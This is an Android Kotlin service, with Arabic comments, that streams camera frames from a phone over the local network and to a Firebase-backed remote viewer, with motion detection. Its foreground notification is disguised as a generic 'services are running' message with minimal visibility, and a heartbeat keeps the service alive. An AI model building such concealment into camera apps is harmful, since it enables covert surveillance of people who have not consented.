package com.example.trackview

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.Matrix
import android.net.wifi.WifiManager
import android.os.Build
import android.os.PowerManager
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageAnalysis
import androidx.camera.core.ImageProxy
import androidx.camera.core.Preview
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.view.PreviewView
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import java.io.ByteArrayOutputStream
import java.net.Inet4Address
import java.net.NetworkInterface
import java.security.SecureRandom
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import kotlin.math.abs

/** كود الغرفة: طويل وعشوائي، ويتحفظ عشان الرابط يبقى نفسه كل مرة */
fun loadOrCreateRoom(context: Context): String {
    val prefs = context.getSharedPreferences("tview", Context.MODE_PRIVATE)
    val saved = prefs.getString("room", null)
    if (saved != null) return saved

    val chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    val random = SecureRandom()
    val created = (1..24).map { chars[random.nextInt(chars.length)] }.joinToString("")
    prefs.edit().putString("room", created).apply()
    return created
}

/**
 * خدمة المراقبة: تشتغل بالخلفية (حتى لو الشاشة مطفية)
 * وهي اللي تمسك الكاميرا وكشف الحركة والبث.
 */
class CameraService : LifecycleService() {

    companion object {
        const val DB_URL = "https://tview-12deb-default-rtdb.europe-west1.firebasedatabase.app"
        const val VIEWER_BASE = "https://huzt99.github.io/Tview-app/"

        const val ACTION_STOP = "com.example.trackview.ACTION_STOP"
        const val ACTION_SWITCH_CAMERA = "com.example.trackview.ACTION_SWITCH_CAMERA"
        private const val CHANNEL_ID = "tview_monitor"
        private const val NOTIFICATION_ID = 1

        // ---- كشف الحركة ----
        private const val GRID_W = 32
        private const val GRID_H = 24
        private const val PIXEL_THRESHOLD = 25
        private const val MOTION_RATIO = 0.03f
        private const val COMPARE_INTERVAL_MS = 250L
        private const val ALERT_COOLDOWN_MS = 3000L

        // ---- البث على نفس الشبكة ----
        private const val PORT = 8080
        private const val STREAM_INTERVAL_MS = 120L
        private const val STREAM_WIDTH = 640
        private const val STREAM_QUALITY = 60

        // ---- حالة تقراها الواجهة ----
        @Volatile var instance: CameraService? = null
        @Volatile var monitoring = false
        @Volatile var usingFrontCamera = false
        @Volatile var lanLink = ""
        @Volatile var lastRemoteStatus = "جاري تجهيز البث من أي مكان…"

        @Volatile var onMotion: (() -> Unit)? = null
        @Volatile var onRemoteStatus: ((String) -> Unit)? = null
        @Volatile var onStateChanged: (() -> Unit)? = null

        @Volatile private var previewView: PreviewView? = null

        fun setPreviewView(view: PreviewView?) {
            previewView = view
            instance?.applyPreview()
        }

        /** يبدّل بين الكاميرا الخلفية والأمامية أثناء التشغيل */
        fun switchCamera() {
            instance?.doSwitchCamera()
        }
    }

    private var started = false
    private var preview: Preview? = null
    private var cameraProvider: ProcessCameraProvider? = null

    private var analysisExecutor: ExecutorService? = null
    private var server: MjpegServer? = null
    private var remote: RemoteStreamer? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiLock: WifiManager.WifiLock? = null

    private var pin = "0000"
    private var previousFrame: IntArray? = null
    private var lastCompareTime = 0L
    private var lastAlertTime = 0L
    private var lastStreamTime = 0L

    override fun onCreate() {
        super.onCreate()
        instance = this
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        when (intent?.action) {
            ACTION_STOP -> {
                stopMonitoring()
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
                return START_NOT_STICKY
            }
            ACTION_SWITCH_CAMERA -> {
                doSwitchCamera()
                return START_NOT_STICKY
            }
        }

        startInForeground()
        startMonitoring()
        scheduleHeartbeat()
        return START_STICKY
    }

    override fun onDestroy() {
        heartbeatHandler.removeCallbacksAndMessages(null)
        stopMonitoring()
        instance = null
        super.onDestroy()
    }

    // ------------------------------------------------------------------
    // Heartbeat: يجدد الخدمة كل 9 دقائق عشان النظام ما يقتلها
    // ------------------------------------------------------------------

    private val heartbeatHandler = android.os.Handler(android.os.Looper.getMainLooper())

    private fun scheduleHeartbeat() {
        heartbeatHandler.removeCallbacksAndMessages(null)
        heartbeatHandler.postDelayed({
            if (started) {
                // نجدد الإشعار عشان النظام يعرف إن الخدمة لسه حية
                val manager = getSystemService(NotificationManager::class.java)
                manager.notify(NOTIFICATION_ID, buildNotification())
                scheduleHeartbeat()
            }
        }, 9 * 60 * 1000L)
    }

    // ------------------------------------------------------------------
    // الإشعار: مطلوب من نظام أندرويد لأي خدمة كاميرا/مايك تشتغل بالخلفية،
    // ولا يمكن إلغاؤه، لكن نخليه بأقل درجة أهمية: بدون صوت، وما يظهر فوق الشاشة.
    // ------------------------------------------------------------------

    private fun startInForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val manager = getSystemService(NotificationManager::class.java)
            val channel = NotificationChannel(CHANNEL_ID, "المراقبة", NotificationManager.IMPORTANCE_MIN)
            channel.setShowBadge(false)
            manager.createNotificationChannel(channel)
        }
        ServiceCompat.startForeground(
            this,
            NOTIFICATION_ID,
            buildNotification(),
            ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        )
    }

    private fun buildNotification(): Notification {
        // بدون أي إجراء عند الضغط عليه، يبقى كإشعار عادي بدون وظيفة
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentTitle("الخدمات تعمل")
            .setContentText(" ")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setOngoing(false)
            .build()
    }

    // ------------------------------------------------------------------
    // تشغيل وإيقاف المراقبة
    // ------------------------------------------------------------------

    private fun startMonitoring() {
        if (started) return
        started = true

        val room = loadOrCreateRoom(this)
        pin = (1000..9999).random().toString()
        previousFrame = null

        analysisExecutor = Executors.newSingleThreadExecutor()
        val mjpeg = MjpegServer(PORT, pin)
        mjpeg.start()
        server = mjpeg

        val ip = getLocalIp()
        lanLink = if (ip != null) "http://$ip:$PORT/?pin=$pin" else ""

        val streamer = RemoteStreamer(this, DB_URL, room)
        streamer.onStatus = { message ->
            lastRemoteStatus = message
            onRemoteStatus?.invoke(message)
        }
        streamer.start()
        remote = streamer

        acquireLocks()
        bindCamera()

        monitoring = true
        onStateChanged?.invoke()
    }

    private fun stopMonitoring() {
        if (!started) return
        started = false

        try {
            cameraProvider?.unbindAll()
        } catch (e: Exception) {
        }
        preview = null

        remote?.stop()
        remote = null
        server?.stop()
        server = null

        analysisExecutor?.shutdown()
        analysisExecutor = null

        releaseLocks()

        monitoring = false
        lanLink = ""
        lastRemoteStatus = "جاري تجهيز البث من أي مكان…"
        onStateChanged?.invoke()
    }

    private fun doSwitchCamera() {
        if (!started) return
        usingFrontCamera = !usingFrontCamera
        bindCamera()
        onStateChanged?.invoke()
    }

    private fun bindCamera() {
        val future = ProcessCameraProvider.getInstance(this)
        future.addListener({
            val executor = analysisExecutor
            if (!started || executor == null) return@addListener

            val provider = future.get()
            cameraProvider = provider

            val previewUseCase = Preview.Builder().build()
            preview = previewUseCase

            val analysis = ImageAnalysis.Builder()
                .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                .build()
                .also { it.setAnalyzer(executor, FrameAnalyzer()) }

            val selector = if (usingFrontCamera) {
                CameraSelector.DEFAULT_FRONT_CAMERA
            } else {
                CameraSelector.DEFAULT_BACK_CAMERA
            }

            try {
                provider.unbindAll()
                provider.bindToLifecycle(this, selector, previewUseCase, analysis)
                applyPreview()
            } catch (e: Exception) {
                val message = "تعذر تشغيل الكاميرا: ${e.message}"
                lastRemoteStatus = message
                onRemoteStatus?.invoke(message)
            }
        }, ContextCompat.getMainExecutor(this))
    }

    fun applyPreview() {
        val useCase = preview ?: return
        useCase.setSurfaceProvider(previewView?.surfaceProvider)
    }

    private fun acquireLocks() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            val lock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "tview:monitor")
            lock.acquire()
            wakeLock = lock
        } catch (e: Exception) {
        }
        try {
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                WifiManager.WIFI_MODE_FULL_LOW_LATENCY
            } else {
                @Suppress("DEPRECATION")
                WifiManager.WIFI_MODE_FULL_HIGH_PERF
            }
            val lock = wm.createWifiLock(mode, "tview:wifi")
            lock.acquire()
            wifiLock = lock
        } catch (e: Exception) {
        }
    }

    private fun releaseLocks() {
        try {
            if (wakeLock?.isHeld == true) wakeLock?.release()
        } catch (e: Exception) {
        }
        wakeLock = null
        try {
            if (wifiLock?.isHeld == true) wifiLock?.release()
        } catch (e: Exception) {
        }
        wifiLock = null
    }

    // ------------------------------------------------------------------
    // معالجة صور الكاميرا
    // ------------------------------------------------------------------

    private inner class FrameAnalyzer : ImageAnalysis.Analyzer {
        override fun analyze(image: ImageProxy) {
            try {
                val now = System.currentTimeMillis()

                if (now - lastCompareTime >= COMPARE_INTERVAL_MS) {
                    lastCompareTime = now
                    detectMotion(image, now)
                }

                val mjpeg = server
                if (mjpeg != null && mjpeg.clients.get() > 0 && now - lastStreamTime >= STREAM_INTERVAL_MS) {
                    lastStreamTime = now
                    mjpeg.update(imageToJpeg(image))
                }

                remote?.pushFrame(image)
            } finally {
                image.close()
            }
        }
    }

    private fun detectMotion(image: ImageProxy, now: Long) {
        val plane = image.planes[0]
        val buffer = plane.buffer
        val rowStride = plane.rowStride
        val stepX = image.width / GRID_W
        val stepY = image.height / GRID_H

        val current = IntArray(GRID_W * GRID_H)
        var i = 0
        for (gy in 0 until GRID_H) {
            for (gx in 0 until GRID_W) {
                val index = (gy * stepY) * rowStride + (gx * stepX)
                current[i++] = buffer.get(index).toInt() and 0xFF
            }
        }

        val previous = previousFrame
        if (previous != null) {
            var changed = 0
            for (k in current.indices) {
                if (abs(current[k] - previous[k]) > PIXEL_THRESHOLD) changed++
            }
            val ratio = changed.toFloat() / current.size
            if (ratio > MOTION_RATIO) onMotionDetected(now)
        }
        previousFrame = current
    }

    private fun onMotionDetected(now: Long) {
        onMotion?.invoke()
        // الصوت محذوف حسب الطلب
    }

    private fun imageToJpeg(image: ImageProxy): ByteArray {
        val bitmap = image.toBitmap()

        val matrix = Matrix()
        matrix.postRotate(image.imageInfo.rotationDegrees.toFloat())
        val scale = STREAM_WIDTH.toFloat() / bitmap.width
        if (scale < 1f) matrix.postScale(scale, scale)

        val result = Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)

        val out = ByteArrayOutputStream()
        result.compress(Bitmap.CompressFormat.JPEG, STREAM_QUALITY, out)

        if (result !== bitmap) result.recycle()
        bitmap.recycle()
        return out.toByteArray()
    }

    private fun getLocalIp(): String? {
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces() ?: return null
            for (ni in interfaces) {
                if (!ni.isUp || ni.isLoopback) continue
                for (addr in ni.inetAddresses) {
                    if (addr is Inet4Address && addr.isSiteLocalAddress) {
                        return addr.hostAddress
                    }
                }
            }
        } catch (e: Exception) {
        }
        return null
    }
}
